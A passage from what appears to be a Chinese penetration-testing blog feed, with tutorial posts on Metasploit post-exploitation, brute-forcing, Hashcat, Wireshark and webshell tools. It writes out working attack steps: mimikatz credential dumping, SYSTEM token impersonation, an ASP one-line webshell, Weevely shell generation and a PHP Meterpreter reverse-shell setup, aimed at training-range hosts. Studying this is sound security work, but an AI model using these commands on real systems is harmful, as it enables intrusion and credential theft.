<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618201749166.png" alt="image-20210618201749166"></li>
</ul>
</li>
</ul>
</li>
<li><h2 id="shell（感觉比较实用的一个了）"><a href="#shell（感觉比较实用的一个了）" class="headerlink" title="shell（感觉比较实用的一个了）"></a>shell（感觉比较实用的一个了）</h2><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618201834813.png" alt="image-20210618201834813"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618201936506.png" alt="image-20210618201936506"></li>
</ul>
</li>
</ul>
</li>
<li><h2 id="mimikatz（被换了个名字kiwi）抓取管理员账号和密码方式"><a href="#mimikatz（被换了个名字kiwi）抓取管理员账号和密码方式" class="headerlink" title="mimikatz（被换了个名字kiwi）抓取管理员账号和密码方式"></a><strong>mimikatz（被换了个名字kiwi）抓取管理员账号和密码方式</strong></h2><ul>
<li><p>load -l （查看可用模块）</p>
<ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618202215220.png" alt="image-20210618202215220"></li>
</ul>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618202236991.png" alt="image-20210618202236991"></p>
</li>
<li><h2 id="使用命令（kiwi-cmd-sekurlsa-logonpasswords）"><a href="#使用命令（kiwi-cmd-sekurlsa-logonpasswords）" class="headerlink" title="使用命令（kiwi_cmd sekurlsa::logonpasswords）"></a>使用命令（kiwi_cmd sekurlsa::logonpasswords）</h2><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618202635214.png" alt="image-20210618202635214"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618202739496.png" alt="image-20210618202739496"></li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li><h2 id="远程CMD命令执行"><a href="#远程CMD命令执行" class="headerlink" title="远程CMD命令执行"></a>远程CMD命令执行</h2><ul>
<li>execute -f cmd -c</li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210619165901762.png" alt="image-20210619165901762"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210619165918970.png" alt="image-20210619165918970"></li>
</ul>
</li>
<li><h2 id="木马模式调到后台执行"><a href="#木马模式调到后台执行" class="headerlink" title="木马模式调到后台执行"></a>木马模式调到后台执行</h2><ul>
<li><h2 id="background"><a href="#background" class="headerlink" title="background"></a>background</h2></li>
</ul>
</li>
<li><h2 id="木马调回前台"><a href="#木马调回前台" class="headerlink" title="木马调回前台"></a>木马调回前台</h2><ul>
<li><h2 id="session-l"><a href="#session-l" class="headerlink" title="session -l"></a>session -l</h2><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210619170225259.png" alt="image-20210619170225259"></li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>
<li><h2 id="令牌操纵"><a href="#令牌操纵" class="headerlink" title="令牌操纵"></a>令牌操纵</h2></li>
<li><p>use incognito #heip incognito 查看帮助</p>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210619170849281.png" alt="image-20210619170849281"></p>
</li>
<li><p>list_tokens -u 查看可用的token</p>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210619170901610.png" alt="image-20210619170901610"></p>
</li>
<li><p>impersonate_token “伪造的身份” #假冒token 或者</p>
</li>
<li><p>举个例子：impersonate_token NT AUTHORITY\SYSTEM #不加单引号 需使用\</p>
</li>
<li><h2 id="execute-f-cmd-exe-i-–t-t-使用假冒的token-执行-或者直接shell"><a href="#execute-f-cmd-exe-i-–t-t-使用假冒的token-执行-或者直接shell" class="headerlink" title="execute -f cmd.exe -i –t # -t 使用假冒的token 执行 或者直接shell"></a>execute -f cmd.exe -i –t # -t 使用假冒的token 执行 或者直接shell</h2><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210619171137897.png" alt="image-20210619171137897"></li>
</ul>
</li>
<li><p>登陆靶机电脑 </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">rdesktop -u 用户名 -p 密码 登陆ip地址</span><br></pre></td></tr></table></figure></div>



</li>
</ul>
<ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210619171255577.png" alt="image-20210619171255577"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210619171334541.png" alt="image-20210619171334541"></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>漏洞工具</tag>
        <tag>渗透测试</tag>
        <tag>msf</tag>
      </tags>
  </entry>
  <entry>
    <title>【漏洞工具】Metasploit框架爆破模块</title>
    <url>/2021/06/18/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%B7%A5%E5%85%B7%E3%80%91Metasploit%E6%A1%86%E6%9E%B6%E7%88%86%E7%A0%B4%E6%A8%A1%E5%9D%97/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="MSF-爆破模块"><a href="#MSF-爆破模块" class="headerlink" title="MSF - 爆破模块"></a>MSF - 爆破模块</h1><blockquote>
<ul>
<li><p>环境<a href="http://www.phpstudy.net" target="_blank" rel="noopener">http://www.phpstudy.net</a></p>
</li>
<li><p>查找爆破模块的姿势</p>
<ul>
<li><p>1、查找服务名</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">search type:auxiliary ssh</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618092405310.png" alt="image-20210618092405310"></p>
</li>
<li><p>2、查找服务器+关键词</p>
<ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618092513787.png" alt="image-20210618092513787"></li>
</ul>
</li>
<li><p>3、 SSH密码爆破</p>
<ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618092627518.png" alt="image-20210618092627518"></li>
</ul>
</li>
<li><p>4、Mysql密码爆破</p>
<ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618092709647.png" alt="image-20210618092709647"></li>
</ul>
</li>
<li><p>5、phpmyadmin登陆验证爆破 </p>
<ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618092753784.png" alt="image-20210618092753784"></li>
</ul>
</li>
</ul>
</li>
<li><p><strong>案例：phpMyAdmin爆破实操</strong></p>
<ul>
<li>环境<a href="http://59.63.200.79:8805/phpmyadmin/" target="_blank" rel="noopener">http://59.63.200.79:8805/phpmyadmin/</a></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618093326802.png" alt="image-20210618093326802"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618093422886.png" alt="image-20210618093422886"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618093939807.png" alt="image-20210618093939807"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618195116416.png" alt="image-20210618195116416"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618094109007.png" alt="image-20210618094109007"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618094151355.png" alt="image-20210618094151355"></li>
<li></li>
</ul>
</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>漏洞工具</tag>
        <tag>渗透测试</tag>
        <tag>msf</tag>
      </tags>
  </entry>
  <entry>
    <title>【嗅探工具】wireshark初步认识</title>
    <url>/2021/06/18/%E3%80%90%E5%97%85%E6%8E%A2%E5%B7%A5%E5%85%B7%E3%80%91wireshark%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Wireshark初步使用"><a href="#Wireshark初步使用" class="headerlink" title="Wireshark初步使用"></a>Wireshark初步使用</h1><blockquote>
<ul>
<li><strong>安装</strong><ul>
<li>下载地址:<a href="https://www.wireshark.org/#download" target="_blank" rel="noopener">https://www.wireshark.org/#download</a></li>
</ul>
</li>
<li><strong>过滤器的使用方法</strong><ul>
<li>http.request.method ==”POST”or icmp.type<ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618205842870.png" alt="image-20210618205842870"></li>
</ul>
</li>
<li>ip.addr == 192.168.1.101<ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618210419617.png" alt="image-20210618210419617"></li>
</ul>
</li>
<li>ip.src == 192.168.1.101/16(来源是这个网段的显示)<ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618210636824.png" alt="image-20210618210636824"></li>
</ul>
</li>
<li>http.hos == “192.168.88.132” 显示主机相关的数据包</li>
<li>tcp.port == 25 显示端口号为25的数据包</li>
<li>tcp.dstport == 25 显示目的tcp端口号为25的数据包</li>
<li>http.response.code==302 显示http响应状态码为302的数据包</li>
<li>tcp contains “http”<ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618211329320.png" alt="image-20210618211329320"></li>
</ul>
</li>
<li>http.host contains “192.168.88.132” 包含主机的数据包</li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="MSF嗅探数据包分析"><a href="#MSF嗅探数据包分析" class="headerlink" title="MSF嗅探数据包分析"></a>MSF嗅探数据包分析</h1><blockquote>
<ul>
<li><h2 id="1、MSF开启嗅探数据"><a href="#1、MSF开启嗅探数据" class="headerlink" title="1、MSF开启嗅探数据"></a>1、MSF开启嗅探数据</h2><ul>
<li><h3 id="sniffer-interfaces"><a href="#sniffer-interfaces" class="headerlink" title="sniffer_interfaces"></a>sniffer_interfaces</h3><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210619172639695.png" alt="image-20210619172639695"></li>
</ul>
</li>
<li><h3 id="sniffer-start-2"><a href="#sniffer-start-2" class="headerlink" title="sniffer_start 2"></a>sniffer_start 2</h3></li>
<li><h3 id="sniffer-stop-2"><a href="#sniffer-stop-2" class="headerlink" title="sniffer_stop 2"></a>sniffer_stop 2</h3></li>
<li><h2 id="sniffer-dump-2-名称-pcap"><a href="#sniffer-dump-2-名称-pcap" class="headerlink" title="sniffer_dump 2 名称.pcap"></a>sniffer_dump 2 名称.pcap</h2><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210619173617848.png" alt="image-20210619173617848"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210619173631541.png" alt="image-20210619173631541"></li>
</ul>
</li>
</ul>
</li>
<li><h2 id="2、wireshark分析数据包"><a href="#2、wireshark分析数据包" class="headerlink" title="2、wireshark分析数据包"></a>2、wireshark分析数据包</h2><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210619173651871.png" alt="image-20210619173651871"></li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="WSExplorer分析"><a href="#WSExplorer分析" class="headerlink" title="WSExplorer分析"></a>WSExplorer分析</h1><blockquote>
<p>可以进行软件包分析</p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210619174229430.png" alt="image-20210619174229430"></p>
</blockquote>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>嗅探工具</tag>
        <tag>wireshark</tag>
      </tags>
  </entry>
  <entry>
    <title>【破解工具】Hashcat加密破解</title>
    <url>/2021/06/17/%E3%80%90%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7%E3%80%91Hashcat%E5%8A%A0%E5%AF%86%E7%A0%B4%E8%A7%A3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="hash密码破解工具-Hashcat"><a href="#hash密码破解工具-Hashcat" class="headerlink" title="hash密码破解工具 - Hashcat"></a>hash密码破解工具 - Hashcat</h1><blockquote>
<p>下载地址：<a href="https://hashcat.net/files/hashcat-6.2.2.7z（使用前提是你在线解密工具不行时）" target="_blank" rel="noopener">https://hashcat.net/files/hashcat-6.2.2.7z（使用前提是你在线解密工具不行时）</a></p>
<p>我的博客：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></p>
</blockquote>
<h1 id="扫描模式"><a href="#扫描模式" class="headerlink" title="扫描模式"></a>扫描模式</h1><blockquote>
<ul>
<li>Mode<ul>
<li>0代号<strong>Straight（字典破解）：基于字典进行破解</strong></li>
<li>1代号<strong>Combination（组合破解）：基于多个字典进行破解</strong></li>
<li>3代号<strong>Brute-force（掩码暴力破解）：基于掩码设置进行破解</strong></li>
<li>6代号<strong>Hybrid Wordlist + Mask（字典+掩码破解）</strong></li>
<li>7代号<strong>Hybrid Mask + Wordlist （掩码+字典破解）</strong></li>
</ul>
</li>
<li>? | Charset<br>===+=========<br>l | abcdefghijklmnopqrstuvwxyz  （26个小写字母）<br>u | ABCDEFGHIJKLMNOPQRSTUVWXYZ （26个大写字母）<br>d | 0123456789 （0-9数字）446515184<br>h | 0123456789abcdef （数字和小写字母）<br>H | 0123456789ABCDEF（数字和大写字母）<br>s |  !”#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_`{|}~ （特殊字符）<br>a | ?l?u?d?s （键盘上所有可见的字符）<br>b | 0x00 - 0xff（可能是用来匹配像空格这样密码的）<ul>
<li>格式：八位数字密码：?d?d?d?d?d?d?d?d</li>
<li>格式：八位未知密码：?a?a?a?a?a?a?a?a</li>
<li>格式：前四位为大写字母，后四位为数字：?u?u?u?u?d?d?d?d</li>
<li>格式：前四位为数字或者是小写字母，后四位为大写字母或者数字：?h?h?h?h?H?H?H?H</li>
<li>格式：前三个字符未知，中间为admin，后三位未知：?a?a?aadmin?a?a?a</li>
<li>6-8位字母密码：–increment –increment-min 6 –increment-max 8 ?l?l?l?l?l?l?l?l</li>
<li>6-8位数字+小写字母密码：–increment –increment-min 6 –increment-max 8 ?h?h?h?h?h?h?h?h</li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h1><blockquote>
<ul>
<li>-a 指定要使用的破解模式，其值参考后面对参数。“-a 0”字典工具，“-a 1”组合攻击；“-a 3”掩码攻击。</li>
<li>-m 指定要破解的hash mode，如果不指定类型，则默认是MD5</li>
<li>-o 指定破解成功后的hash及所对应的明文密码的存放位置，可以用它把破解成功的hash写到指定的文件中</li>
<li>–force 忽略破解过程中的警告信息，跑单条hash可能需要加上此选项</li>
<li>–show 显示已经破解的hash及该hash所对应的明文</li>
<li>–increment 启用增量破解模式，你可以利用此模式让hashcat在指定的密码长度范围内执行破解过程</li>
<li>–increment-min 密码最小长度，后面直接等于一个整数即可，配置increment模式一起使用</li>
<li>–increment-max 密码最大长度，同上</li>
<li>–outfile-format 指定破解结果的输出格式id，默认是3</li>
</ul>
</blockquote>
<h1 id="实例破解"><a href="#实例破解" class="headerlink" title="实例破解"></a>实例破解</h1><blockquote>
<ul>
<li><p>一、数字破解（8位：13245786）md5:<strong>38cf51764f772c1ab70362efa4a1da67</strong></p>
<ul>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210617204428793.png" alt="image-20210617204428793"></p>
</li>
<li><p><strong>命令 ：（意思就是说6-8之间的数字进行掩码破解）</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">hashcat -a 3 -m 0 38cf51764f772c1ab70362efa4a1da67 --increment --increment-min 6 --increment-max 8 ?d?d?d?d?d?d?d?d</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210617204751135.png" alt="image-20210617204751135"></p>
</li>
</ul>
</li>
<li><p>二、小写字母和数字（8位：4a1b2a2c）md5:<strong>9ab70b87e486f5430537b5547c976037</strong></p>
<ul>
<li><p><strong>命令：（6-8位的小写字母和数字掩码破解）</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">hashcat -a 3 -m 0 9ab70b87e486f5430537b5547c976037 --increment --increment-min 1 --increment-max 8 ?h?h?h?h?h?h?h?h</span><br></pre></td></tr></table></figure></div>

<p><img src="C:%5CUsers%5C23242%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210617212252552.png" alt="image-20210617212252552"></p>
</li>
</ul>
</li>
<li><p><strong>三、任意字符破解(4位：A1b;)md5:f67550e2ddf5eeba1662f8ee8974bf5b</strong></p>
<ul>
<li><p><strong>命令（破解时间过长，我就用四位做示例，四位数只用几秒）</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">hashcat -a 3 -m 0 f67550e2ddf5eeba1662f8ee8974bf5b --increment --increment-min 1 --increment-max 4 ?a?a?a?a</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210617212617592.png" alt="image-20210617212617592"></p>
</li>
</ul>
</li>
<li><p><strong>字典破解</strong>：-a 0是指字典破解模式 ， -o是输出结果到文件中</p>
<ul>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210617212821487.png" alt="image-20210617212821487"></p>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210617213108380.png" alt="image-20210617213108380"></p>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210617213345945.png" alt="image-20210617213345945"></p>
</li>
<li><p>命令</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">hashcat -m 0 -a 0 .&#x2F;dict&#x2F;hash.txt .&#x2F;dict&#x2F;password.txt -o result.txt</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210617213500840.png" alt="image-20210617213500840"></p>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210617213550991.png" alt="image-20210617213550991"></p>
</li>
</ul>
</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>爆破工具</tag>
        <tag>Hashcat</tag>
      </tags>
  </entry>
  <entry>
    <title>【漏洞工具】Metasploit框架基本命令</title>
    <url>/2021/06/16/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%B7%A5%E5%85%B7%E3%80%91Metasploit%E6%A1%86%E6%9E%B6%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="MSF—基础命令"><a href="#MSF—基础命令" class="headerlink" title="MSF—基础命令"></a>MSF—基础命令</h1><blockquote>
<ul>
<li>一、开启数据库：service postgresql start  (作用是加快开启速度)<ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210616150345672.png" alt="image-20210616150345672"></li>
</ul>
</li>
<li><strong>二、开启MSF： msfconsole</strong></li>
<li><strong>三、help命令</strong></li>
</ul>
</blockquote>
<h1 id="常规模块"><a href="#常规模块" class="headerlink" title="常规模块"></a>常规模块</h1><blockquote>
<ul>
<li>show payloads（载荷）<ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210616222126173.png" alt="image-20210616222126173"></li>
</ul>
</li>
<li>show auxiliary （辅助）</li>
<li>show exploits（利用）</li>
<li>命名规则：操作系统/服务/名称  <strong>windows/smb/ms17_010_eternalblue</strong></li>
<li>显示模块信息：<strong>info windows/smb/ms17_010_eternalblue</strong></li>
<li>根据名称搜索：<strong>search ms17</strong></li>
<li>返回：back</li>
<li>联合搜索-根据类型和名称搜索：  search type:auxiliary name:ms17</li>
<li>hosts查看主机</li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618081829430.png" alt="image-20210618081829430"></li>
<li>hosts -c mac查看会话主机</li>
</ul>
</blockquote>
<h1 id="MSF-扫描模块"><a href="#MSF-扫描模块" class="headerlink" title="MSF - 扫描模块"></a>MSF - 扫描模块</h1><blockquote>
<ul>
<li><p><strong>信息收集</strong></p>
<ul>
<li><p>一、<strong>可查网站</strong><a href="https://www.benmi.com/whois/zkaq.org" target="_blank" rel="noopener">https://www.benmi.com/whois/zkaq.org</a></p>
</li>
<li><p>二、<strong>kali自带whois</strong></p>
<ul>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210616205344226.png" alt="image-20210616205344226"></p>
</li>
<li><p>三、<strong>在线密码生成器：<a href="https://www.bugku.com/mima/" target="_blank" rel="noopener">https://www.bugku.com/mima/</a></strong></p>
</li>
<li><p>四、开源在线工具利用phpstudy运行：<a href="https://github.com/Acmesec/PoCBox" target="_blank" rel="noopener">https://github.com/Acmesec/PoCBox</a></p>
</li>
<li><p>五、DNS查询</p>
<ul>
<li><p>nslookup</p>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618085408521.png" alt="image-20210618085408521"></p>
</li>
<li><p><strong>Dnsenum来找dns</strong></p>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618130309657.png" alt="image-20210618130309657"></p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>六、<strong>MSF - 中可以使用db_Nmap和实际上的Nmap差不多</strong></p>
<ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618085641631.png" alt="image-20210618085641631"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618085821802.png" alt="image-20210618085821802"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618085902626.png" alt="image-20210618085902626"></li>
</ul>
</li>
<li><p><strong>七、自动化扫描插件 wmap</strong></p>
<ul>
<li><p><strong>laod wmap 加载插件</strong></p>
<ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618090334470.png" alt="image-20210618090334470"></li>
</ul>
</li>
<li><p>查看模块命令 </p>
<p>​    <img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618090321922.png" alt="image-20210618090321922"></p>
</li>
<li><p><strong>wmap_sites -a url 添加目标</strong></p>
</li>
<li><p><strong>wmap_targets -t url 添加目标URL地址</strong></p>
</li>
<li><p><strong>wmap_run -e 测试目标</strong></p>
</li>
<li><p><strong>wmap_vulns 查看漏洞详细信息</strong></p>
</li>
</ul>
</li>
<li><p><strong>kali自带漏洞库 - searchsploit</strong></p>
<ul>
<li>离线漏洞数据库搜索工具<ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618091341979.png" alt="image-20210618091341979"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618091806714.png" alt="image-20210618091806714"></li>
</ul>
</li>
<li><strong>漏洞数据库使用手册</strong>：<a href="https://www.exploit-db.com/searchsploit" target="_blank" rel="noopener">https://www.exploit-db.com/searchsploit</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>漏洞工具</tag>
        <tag>渗透测试</tag>
        <tag>msf</tag>
      </tags>
  </entry>
  <entry>
    <title>【入侵工具】webshell管理工具基础使用</title>
    <url>/2021/06/16/%E3%80%90%E5%85%A5%E4%BE%B5%E5%B7%A5%E5%85%B7%E3%80%91webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="测试靶场"><a href="#测试靶场" class="headerlink" title="测试靶场"></a>测试靶场</h1><blockquote>
<p>环境：<a href="http://59.63.200.79:8804/" target="_blank" rel="noopener">http://59.63.200.79:8804/</a></p>
</blockquote>
<h1 id="木马"><a href="#木马" class="headerlink" title="木马"></a>木马</h1><blockquote>
<ul>
<li><p><strong>小马：上传文件，体积较小，文件管理</strong>（例如sqlmap的管理os-shell里面就会帮你上传小马）</p>
</li>
<li><p><strong>大马： 文件体积较大、功能齐全、能够提权、操作数据库等</strong></p>
</li>
<li><p><strong>一句话木马（主流）：功能强大、客户端直接管理</strong>   </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">例如：</span><br><span class="line">asp的一句话木马：&lt;% execute request[&#39;a&#39;]%&gt;</span><br><span class="line">php的一句话木马：</span><br></pre></td></tr></table></figure></div>
</li>
</ul>
</blockquote>
<h1 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h1><blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210616132010184.png" alt="image-20210616132010184"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210616132124651.png" alt="image-20210616132124651"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210616132150963.png" alt="image-20210616132150963"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210616132342456.png" alt="image-20210616132342456"></p>
</blockquote>
<h1 id="中国蚁剑"><a href="#中国蚁剑" class="headerlink" title="中国蚁剑"></a>中国蚁剑</h1><blockquote>
<ul>
<li>安装：<a href="https://github.com/yzddmr6/As-Exploits" target="_blank" rel="noopener">https://github.com/yzddmr6/As-Exploits</a></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210616132526774.png" alt="image-20210616132526774"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210616132611141.png" alt="image-20210616132611141"></li>
</ul>
</blockquote>
<h1 id="Kali-Linux-shell-Weevely"><a href="#Kali-Linux-shell-Weevely" class="headerlink" title="Kali Linux shell Weevely"></a>Kali Linux shell Weevely</h1><blockquote>
<p>安装：<a href="https://github.com/epinna/weevely3" target="_blank" rel="noopener">https://github.com/epinna/weevely3</a>   (一般kali linux都自带了)</p>
<ul>
<li><p><strong>1、生成shell</strong></p>
<ul>
<li><strong>命令： weevely generate 123 shell.php</strong></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210616135707456.png" alt="image-20210616135707456"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210616135743703.png" alt="image-20210616135743703"></li>
</ul>
</li>
<li><p><strong>2、连接shell</strong></p>
<ul>
<li>命令：weevely <a href="http://59.63.200.79:8804/shell.php" target="_blank" rel="noopener">http://59.63.200.79:8804/shell.php</a> 123</li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210616140415117.png" alt="image-20210616140415117"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210616140714901.png" alt="image-20210616140714901"></li>
</ul>
</li>
<li><p>基本模块使用</p>
<ul>
<li><p>1、system_info</p>
</li>
<li><p><img src="C:%5CUsers%5C23242%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210616141257686.png" alt="image-20210616141257686"></p>
</li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="生成meterpreter会话"><a href="#生成meterpreter会话" class="headerlink" title="生成meterpreter会话"></a>生成meterpreter会话</h1><blockquote>
<ul>
<li><p><strong>MSF设置</strong></p>
<ul>
<li>use exploit/multi/handler</li>
<li>show payloads</li>
<li>set payload php/meterpreter/reverse_tcp</li>
<li>show options</li>
<li>set lhost 本机IP</li>
<li>run</li>
</ul>
</li>
<li><p>2、生成meterpreter会话</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">backdoor_meterpreter -payload php&#x2F;meterpreter&#x2F;reverse_tcp -lhost 本机ip -port 端口</span><br></pre></td></tr></table></figure></div>

</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
        <tag>漏洞工具</tag>
      </tags>
  </entry>
  <entry>
    <title>【注入工具】SQLmap实践手册</title>
    <url>/2021/06/15/%E3%80%90%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E3%80%91SQLmap%E5%AE%9E%E8%B7%B5%E6%89%8B%E5%86%8C/</url>
